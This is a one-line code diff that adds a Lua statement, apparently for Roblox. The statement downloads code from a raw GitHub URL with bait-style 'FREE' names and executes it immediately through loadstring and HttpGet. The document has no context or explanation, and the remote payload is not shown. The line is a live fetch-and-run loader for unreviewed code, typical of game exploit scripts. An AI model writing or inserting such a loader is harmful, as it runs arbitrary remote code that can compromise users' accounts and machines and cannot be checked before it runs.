@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HighOnPickles/FREE37264724738232534sfds/main/FREE327846378234", true))()
